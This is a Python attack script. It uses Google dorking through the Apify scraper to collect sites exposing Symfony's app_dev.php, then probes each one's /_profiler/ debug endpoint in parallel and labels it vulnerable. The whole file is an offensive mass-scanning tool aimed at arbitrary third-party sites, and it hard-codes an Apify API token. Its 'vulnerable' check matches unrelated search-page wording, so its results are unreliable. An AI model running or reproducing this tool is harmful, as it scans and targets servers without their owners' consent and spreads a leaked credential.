import requests
from requests.exceptions import SSLError, ConnectionError
from concurrent.futures import ThreadPoolExecutor
import colorama
def check_vulnerability(session, url):
    try:
        new_url = url.replace("app_dev.php", "app_dev.php/_profiler/")
        response = session.get(new_url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'}, timeout=10)
        if response.status_code == 200 and any(keyword in response.text for keyword in ("Search Results", "results found")):
            print(f"{colorama.Fore.CYAN}[+] {colorama.Fore.WHITE}{url} - {colorama.Fore.LIGHTYELLOW_EX}{colorama.Style.BRIGHT}This site is VULNERABLE{colorama.Fore.WHITE}")
        else:
            print(f"{colorama.Fore.RED}[-] {colorama.Fore.WHITE}{url} - {colorama.Fore.LIGHTYELLOW_EX}{colorama.Style.BRIGHT}This site is NOT VULNERABLE{colorama.Fore.WHITE}")

    except SSLError:
        print(f"{colorama.Fore.BLUE}[!] {colorama.Fore.WHITE}{url} - SSL Error occurred, continuing to next URL...")
    except ConnectionError:
        print(f"{colorama.Fore.BLUE}[!] {colorama.Fore.WHITE}{url} - Connection Error occurred, continuing to next URL..")
    except Exception as e:
        print(f"{colorama.Fore.BLUE}[!] {colorama.Fore.WHITE}{url} - Error: {e}")

def google_search(DORK):
    from apify_client import ApifyClient
    session = requests.Session()
    session.verify = True

    client = ApifyClient("apify_api_mOsdo7nPdxPxhVdI7eB0YjZRfIn95a0IyJPa")

    run_input = {
        "queries": DORK,
        "resultsPerPage": 100,
        "maxPagesPerQuery": 1,
    }

    run = client.actor("apify/google-search-scraper").call(run_input=run_input)

    vuln_urls = []
    for item in client.dataset(run["defaultDatasetId"]).iterate_items():
        urls = [result["url"] for result in item["organicResults"]]
        vuln_urls.extend(urls) 
    print(colorama.Fore.LIGHTGREEN_EX+"[=]"+colorama.Fore.WHITE+" "+colorama.Fore.LIGHTBLUE_EX+"URL SAYI: "+colorama.Fore.WHITE + str(len(urls))+"\n\n")
    return vuln_urls
def banner():
    colorama.init()
    banner="""

 (                      (                             
 )\ )          )        )\ )                       )  
(()/(    )  ( /(    (  (()/(     (   (          ( /(  
 /(_))( /(  )\())  ))\  /(_)) (  )(  )\  `  )   )\()) 
(_))_|)(_))((_)\  /((_)(_))   )\(()\((_) /(/(  (_))/  
| |_ ((_)_ | |(_)(_))  / __| ((_)((_)(_)((_)_\ | |_   
| __|/ _` || / / / -_) \__ \/ _|| '_|| || '_ \)|  _|  
|_|  \__,_||_\_\ \___| |___/\__||_|  |_|| .__/  \__|  
                                        |_|           
    
    """
    colored_ascii_art = (
        colorama.Fore.RED 
        + colorama.Style.BRIGHT 
        + banner 
        + colorama.Fore.WHITE 
        + colorama.Style.RESET_ALL
    )
    print(colored_ascii_art)
    print(
        colorama.Fore.BLUE 
        + f"""
-------------------------------------------------------------

{colorama.Fore.GREEN+"[!] GETTING URLS..."+colorama.Fore.BLUE}

-------------------------------------------------------------
""" 
        + colorama.Fore.WHITE
    )
def main():
    DORK = 'inurl:"app_dev.php*"'
    banner()
    google_results = google_search(DORK)
    if google_results:
     
        session = requests.Session()
        session.verify = True

        with ThreadPoolExecutor(max_workers=10) as executor:
            for url in google_results:
                if "app_dev.php" in url:
                    url = url[:url.index(".php")+4]
                    executor.submit(check_vulnerability, session, url)

if __name__ == "__main__":
    main()
